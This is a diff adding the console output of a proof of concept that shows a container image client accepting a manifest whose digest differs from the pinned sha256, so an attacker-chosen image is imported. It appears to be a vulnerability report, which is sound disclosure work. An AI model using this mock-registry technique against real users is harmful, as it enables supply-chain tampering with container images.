@@ -1,0 +1,49 @@
+## manifest-poc results
+
+```
+========================================================================
+PART 1 -- direct RegistryClient.fetch() against the real project code
+========================================================================
+[*] Constructing RegistryClient(host: "127.0.0.1", scheme: "http", port: 49203)
+[*] Requesting manifest at PINNED digest: sha256:d63bef6166a2e069af5b947e09aacb183fc83e0d4aceb84d8b1bab31017b122f
+    (this is the digest a caller would pin via image@\(expectedDigest))
+[+] client.fetch() returned SUCCESSFULLY -- no digest-mismatch error was thrown.
+    Returned manifest has 1 layer(s).
+    layers[0].digest = sha256:3dcebf49f57af6e1e54d6bb68aebfaf6b39edb5e40e2f67ff9c1c5c71efcb0c3
+    config.digest    = sha256:55a07f9076b8ec37d9d5c7bd506476bcfaf1e05ace56e56b3472d9b32743f83d
+
+[*] Independently fetching the SAME URL as raw bytes via client.fetchData()
+    requested digest       : sha256:d63bef6166a2e069af5b947e09aacb183fc83e0d4aceb84d8b1bab31017b122f
+    actual SHA256 of body  : sha256:ddf5beee9f2dbf915d777a58aaabfc612722ce3338c71f45bb536f854eb13476
+
+[+] CONFIRMED: the response body does NOT hash to the digest it was
+    requested/pinned by. client.fetch() above accepted and decoded it anyway.
+
+    This is precisely the check ImageStore+Import.swift performs for blob
+    content:  guard digest.digestString == descriptor.digest else { throw ... }
+    getManifestContent() -- the manifest path -- never performs it.
+
+========================================================================
+PART 2 -- full ImageStore.pull() end-to-end (matches original report's
+          literal reproduction steps: `container pull name@sha256:...`)
+========================================================================
+[*] Creating throwaway ImageStore at /var/folders/df/djsxfhc17x95674wsm_g8s980000gn/T/manifest-poc-store-1C4B8305-68D7-46D9-93BE-4E68A8F0B4EB
+[*] Calling store.pull(reference: "127.0.0.1:49203/victim/image@sha256:d63bef6166a2e069af5b947e09aacb183fc83e0d4aceb84d8b1bab31017b122f", insecure: true)
+    This is the exact same public API `container pull` uses.
+    The mock registry will report a DIFFERENT Docker-Content-Digest
+    than sha256:d63bef6166a2e069af5b947e09aacb183fc83e0d4aceb84d8b1bab31017b122f in its HEAD response (resolve()'s gap),
+    then serve content that is self-consistent with THAT digest but
+    unrelated to the one pinned here (fetch()'s gap).
+
+[+] pull() SUCCEEDED. No digest-mismatch error at any point.
+    pinned digest (what the reference asked for) = sha256:d63bef6166a2e069af5b947e09aacb183fc83e0d4aceb84d8b1bab31017b122f
+    image.digest  (what actually got imported)   = sha256:0acf091b8deeb8a2695e4b4b75e77515af55ffcd2e4570ca5731ba9469a3af64
+    image.reference  = 127.0.0.1:49203/victim/image@sha256:d63bef6166a2e069af5b947e09aacb183fc83e0d4aceb84d8b1bab31017b122f
+    image.mediaType  = application/vnd.oci.image.index.v1+json
+
+[+] IMPACT CONFIRMED: a pull pinned to one digest silently imported
+    a completely different, attacker-chosen manifest and its referenced
+    layers, with no error anywhere in the chain. Nothing checked that
+    the actually-imported digest matched the one that was pinned.
+
+exit status: 0
